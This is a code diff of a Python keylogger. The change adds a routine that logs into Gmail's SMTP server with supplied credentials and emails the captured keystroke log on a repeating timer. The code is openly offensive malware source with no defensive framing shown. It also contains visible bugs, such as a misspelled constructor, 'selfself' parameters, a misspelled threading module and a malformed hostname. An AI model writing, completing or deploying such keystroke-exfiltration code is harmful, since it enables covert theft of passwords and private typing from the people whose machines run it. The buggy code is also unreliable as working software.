@@ -1,10 +1,14 @@
 #!/usr/bin/env python
 import pynput.keyboard
 import threading
+import smtplib
 
 class Keylogger:
-    def _init_(self):
-        self.log = ""
+    def _init_(self, time_interval, email, password):
+        self.log = " -/- Keylogger has initiated "
+        self.interval = time_interval
+        self.email = email
+        self.password = password
 
     def append_to_log(selfself, string):
         self.log = self.log + string
@@ -20,10 +24,17 @@ class Keylogger:
         self.append_to_log(current_key)
 
     def report(self):
-        print(self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
-        timer = threaing.Timer(5, self.report)
+        timer = threaing.Timer(self.interval, self.report)
         timer.start()
+
+    def send_mail(selfself, email, password, message):
+        server = smtplib.SMTP(" smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
